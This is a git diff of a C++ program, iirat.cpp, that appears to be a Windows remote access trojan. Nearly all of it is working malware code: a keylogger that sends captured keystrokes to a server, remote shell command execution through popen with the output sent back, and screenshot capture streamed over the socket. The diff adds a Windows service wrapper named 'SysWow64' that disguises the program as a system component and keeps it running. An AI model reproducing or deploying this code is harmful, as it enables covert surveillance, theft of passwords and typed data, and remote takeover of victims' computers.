@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-10 04:53:06
+* @Last Modified time: 2017-04-12 22:59:20
 */
 
 #include <vector>
@@ -17,7 +17,7 @@ using namespace std;
 
 #if __WIN__
 
-    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 -lgdiplus -lole32 */
+    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 -lgdiplus -lole32 -DDEBUG */
 
     /* supporting win 7 or later only */
     #define WINVER _WIN32_WINNT_WIN7
@@ -45,10 +45,19 @@ using namespace std;
     #include <sys/socket.h>
     #include <netinet/in.h>
 
+    "not fully supported yet"
+
 #else
 
     "You forget to define platform"
 
+#endif
+
+/* debugger print */
+#ifdef DEBUG
+    #define DPRINT(...) fprintf(stdout, __VA_ARGS__)
+#else
+    #define DPRINT(...)
 #endif
 
 static bool logged_in = false;
@@ -103,6 +112,7 @@ pthread_mutex_t mutex_socket;
 int send_request(int socket, const char *buffer, int size, bool applylock)
 {
     int status = 0, wait = 3;
+    DPRINT("%s(): %x %d %d\n", __func__, socket, buffer, size, applylock);
 
     /* do we need to apply lock? */
     if (applylock) pthread_mutex_lock(&mutex_socket);
@@ -111,28 +121,36 @@ int send_request(int socket, const char *buffer, int size, bool applylock)
     write(socket, buffer, size);
 
     while(!command_ack && wait-- > 0)
-        sleep(10);
+    {
+        sleep(100);
+        DPRINT("%s() retry: command_ack not recieved\n", __func__);
+    }
 
     status = command_ack == true;
 
     if (applylock) pthread_mutex_unlock(&mutex_socket);
+    DPRINT("\tstatus: %d\n", status);
     return status;
 }
 
 void *logger(void *args)
 {
-    int i, index = 3;
-    int socket = *(int*)args;
-    vector<char> buffer(100);
+    int i, index = 3, socket;
+    vector<char> buf(100);
 
-    sprintf(buffer.data(), "SAV");
+    DPRINT("%s()\n", __func__);
+
+    socket = *(int*)args;
+    sprintf(buf.data(), "SAV");
     while(true)
     {
         // maximum of 3 entries can be made in a single loop so 1020
         if (index >= 90)
         {
+            DPRINT("%s(): sending data\n", __func__);
+
             /* send data */
-            send_request(socket, buffer.data(), index, true);
+            send_request(socket, buf.data(), index, true);
 
             /* reset buffer */
             index = 3;
@@ -142,21 +160,21 @@ void *logger(void *args)
         {
             /* get special key's status */
             if (GetAsyncKeyState(keycodes[i]))
-                buffer[index++] = i;
+                buf[index++] = i;
         }
 
         for (int i = 0x41; i < 0x5B; i++)
         {
             /* get alphabets */
             if (GetAsyncKeyState(i))
-                buffer[index++] = i;
+                buf[index++] = i;
         }
 
         for (int i = 0x30; i < 0x3A; i++)
         {
             /* get numeric keys */
             if (GetAsyncKeyState(i))
-                buffer[index++] = i;
+                buf[index++] = i;
         }
 
         sleep(100);
@@ -168,6 +186,8 @@ void register_device(int socket, string recv_uid)
     ifstream infile;
     ofstream outfile;
     char filename[] = ".socket";
+
+    DPRINT("%s()\n", __func__);
 
     if (recv_uid.size())
     {
@@ -181,6 +201,7 @@ void register_device(int socket, string recv_uid)
 
     if (!infile)
     {
+        DPRINT("%s(): file not found!\n", __func__);
         write(socket, "REG", 4);
         return;
     }
@@ -190,6 +211,8 @@ void register_device(int socket, string recv_uid)
     infile.close();
 
     uid = "LOG" + uid;
+    DPRINT("%s(): %s\n", __func__, uid.c_str());
+
     write(socket, uid.c_str(), uid.size());
 }
 
@@ -203,38 +226,35 @@ void *execute_cmd(void* arguments)
 {
     int len;
     FILE *pPipe;
-    char buffer[150];
+    vector<char> buf(150);
     struct cmd_args *args;
 
     args = (struct cmd_args *)arguments;
-    cout << args->cmd << endl;
+    DPRINT("%s()\n", __func__);
 
     fflush(stdin);
     pPipe = popen(args->cmd.c_str(), "r");
     if (pPipe == NULL)
     {
-        sprintf(buffer, "RSP%07dFailed to create pipe!", 0);
-        send_request(args->socket, buffer, strlen(buffer), true);
+        DPRINT("%s(): pipe creation failed!\n", __func__);
+
+        sprintf(buf.data(), "RSP%07dFailed to create pipe!", 0);
+        send_request(args->socket, buf.data(), strlen(buf.data()), true);
         return NULL;
     }
 
     /* we want this data to be contigous */
 
-    // lock socket write stream
-    pthread_mutex_lock(&mutex_socket);
-
     string str;
-    while(fgets(buffer, 128, pPipe))
+    while(fgets(buf.data(), 128, pPipe))
     {
-        str = buffer;
-        len = strlen(buffer) + 10;
-        sprintf(buffer, "RSP%07d%s", len, str.c_str());
-        send_request(args->socket, buffer, len, false);
+        str = buf.data();
+        len = (int)str.size() + 10;
+        sprintf(buf.data(), "RSP%07d%s", len, str.c_str());
+        send_request(args->socket, buf.data(), len, true);
     }
 
-    // unlock socket write stream
-    pthread_mutex_unlock(&mutex_socket);
-
+    DPRINT("%s(): %d\n", __func__, feof(pPipe));
     pclose(pPipe);
     return NULL;
 }
@@ -282,6 +302,7 @@ void *get_screenshot(void* arguments)
     GdiplusStartupInput gdiplusStartupInput;
 
     args = (struct cmd_args *)arguments;
+    DPRINT("%s()\n", __func__);
 
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
@@ -316,22 +337,24 @@ void *get_screenshot(void* arguments)
     pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
     pStream->Stat(&stg, STATFLAG_NONAME);
 
-    char buffer[1024];
     ULONG bytesRead = 0;
-    int size2read = stg.cbSize.LowPart;
+    vector<char> buf(1024);
 
-    sprintf(buffer, "RSP%07d", size2read + 10);
+    int size2read = stg.cbSize.LowPart;
+    sprintf(buf.data(), "RSP%07d", size2read + 10);
+
+    DPRINT("%s(): %d\n", __func__, size2read);
 
     /* we want this data to be contigous */
 
     // lock socket write stream
     pthread_mutex_lock(&mutex_socket);
 
-    send_request(args->socket, buffer, strlen(buffer), false);
+    send_request(args->socket, buf.data(), strlen(buf.data()), false);
     for (int i = 0; i < size2read; i += 1000)
     {
-        pStream->Read(buffer, 1000, &bytesRead);
-        send_request(args->socket, buffer, bytesRead, false);
+        pStream->Read(buf.data(), 1000, &bytesRead);
+        send_request(args->socket, buf.data(), bytesRead, false);
     }
 
     // unlock socket write stream
@@ -339,7 +362,7 @@ void *get_screenshot(void* arguments)
     return NULL;
 }
 
-int main(int argc, char *argv[])
+int run(int argc, char *argv[])
 {
     int sock, len;
     string cmd, req;
@@ -354,28 +377,28 @@ int main(int argc, char *argv[])
     sock = socket(AF_INET , SOCK_STREAM , 0);
     if (sock < 0)
     {
-        printf("could not create socket\n");
-        exit(0);
+        DPRINT("%s(): could not create socket\n", __func__);
+        return -1;
     }
 
     /* configurations */
     addr.sin_family = AF_INET;
     addr.sin_port = htons(9009);
 
-    if (inet_pton(AF_INET, argv[1], &addr.sin_addr) <= 0)
+    if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) <= 0)
     {
-        printf("address resolve failed\n");
-        exit(0);
+        DPRINT("%s(): address resolve failed\n", __func__);
+        return -1;
     }
 
     /* try to connect */
     if (connect(sock, (struct sockaddr *)&addr , sizeof(addr)) < 0)
     {
-        printf("Unable to connect\n");
-        exit(0);
+        DPRINT("%s(): unable to connect\n", __func__);
+        return -1;
     }
 
-    printf("Server Connected :)\n");
+    DPRINT("%s(): server connected\n", __func__);
 
     /* add client and stdin to read list */
     FD_ZERO(&active_fd_set);
@@ -392,8 +415,8 @@ int main(int argc, char *argv[])
 
         if (select(FD_SETSIZE, &read_fd_set, NULL, NULL, NULL) < 0)
         {
-            printf("select error\n");
-            exit(0);
+            DPRINT("%s(): select error\n", __func__);
+            return -1;
         }
 
         for (int i = 0; i < FD_SETSIZE; i++)
@@ -404,8 +427,8 @@ int main(int argc, char *argv[])
                 {
                     if ((len = read(sock, buffer.data(), buffer.size())) <= 0)
                     {
-                        printf("\ndisconnected from the server\n");
-                        exit(0);
+                        DPRINT("%s(): disconnected from the server\n", __func__);
+                        return -1;
                     }
 
                     // null termination
@@ -416,7 +439,7 @@ int main(int argc, char *argv[])
 
                     if (req == "UID")
                     {
-                        printf("[UID] key=\'%s\'\n", cmd.substr(3).c_str());
+                        DPRINT("%s(): [UID] key=\'%s\'\n", __func__, cmd.substr(3).c_str());
 
                         /* change current state */
                         logged_in = false;
@@ -426,14 +449,14 @@ int main(int argc, char *argv[])
                     }
                     else if (req == "HLO")
                     {
-                        printf("[HLO] Hello!\n");
+                        DPRINT("%s(): [HLO] Hello!\n", __func__);
 
                         /* login successful */
                         logged_in = true;
                     }
                     else if (req == "INV")
                     {
-                        printf("[INV] Invalid\n");
+                        DPRINT("%s(): [INV] Invalid!\n", __func__);
 
                         remove(".socket");
 
@@ -445,7 +468,7 @@ int main(int argc, char *argv[])
                     }
                     else if (req == "IDY")
                     {
-                        printf("[IDY] Identify\n");
+                        DPRINT("%s(): [IDY] Identify\n", __func__);
 
                         /* session flushed */
                         logged_in = false;
@@ -455,12 +478,12 @@ int main(int argc, char *argv[])
                     }
                     else if (req == "CMD")
                     {
-                        printf("[CMD] \'%s\'\n", req.c_str());
+                        DPRINT("%s(): [CMD] \'%s\'\n", __func__, req.c_str());
 
                         req = cmd.substr(3, 4);
 
                         if (pthread_cancel(cmd_thread))
-                            printf("Failed to kill previous thread\n");
+                            DPRINT("%s(): failed to kill thread\n", __func__);
 
                         cmdargs.socket = sock;
                         cmdargs.cmd = cmd.substr(7);
@@ -484,5 +507,81 @@ int main(int argc, char *argv[])
         }
     }
 
+    return 0;
+}
+
+
+/*******************************************************************************
+|                                Service Control                               |
+*******************************************************************************/
+
+SERVICE_STATUS ServiceStatus;
+SERVICE_STATUS_HANDLE hServiceStatus;
+
+void ControlHandler(DWORD request)
+{
+    switch(request)
+    {
+        case SERVICE_CONTROL_STOP:
+            ServiceStatus.dwWin32ExitCode = 0;
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
+            SetServiceStatus (hServiceStatus, &ServiceStatus);
+            return;
+
+        case SERVICE_CONTROL_SHUTDOWN:
+            ServiceStatus.dwWin32ExitCode = 0;
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
+            SetServiceStatus (hServiceStatus, &ServiceStatus);
+            return;
+
+        default:
+            break;
+    }
+    SetServiceStatus(hServiceStatus,  &ServiceStatus);
+}
+
+void ServiceMain(int argc, char **argv)
+{
+    ServiceStatus.dwServiceType = SERVICE_WIN32;
+    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP |
+                                       SERVICE_ACCEPT_SHUTDOWN;
+    ServiceStatus.dwWin32ExitCode = 0;
+    ServiceStatus.dwServiceSpecificExitCode = 0;
+    ServiceStatus.dwCheckPoint = 0;
+    ServiceStatus.dwWaitHint = 0;
+
+    hServiceStatus = RegisterServiceCtrlHandler("ServiceTest", (LPHANDLER_FUNCTION) ControlHandler);
+    if (hServiceStatus == (SERVICE_STATUS_HANDLE) 0) {
+        // Registering Control Handler failed
+        return;
+    }
+
+    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    SetServiceStatus (hServiceStatus, &ServiceStatus);
+
+    freopen(".SysWow64.log", "a", stdout);
+    run(0, NULL);
+    /*
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
+        // Do you important service stuff here
+        Sleep(5000);
+    }*/
+}
+
+int main(int argc, char *argv[])
+{
+    if (argc > 1 && strcmp(argv[1], "app") == 0)
+    {
+        return run(argc, argv);
+    }
+
+    SERVICE_TABLE_ENTRY serviceTable[2];
+    serviceTable[0].lpServiceName = "SysWow64";
+    serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+
+    serviceTable[1].lpServiceName = NULL;
+    serviceTable[1].lpServiceProc = NULL;
+    StartServiceCtrlDispatcher(serviceTable);
     return 0;
 }
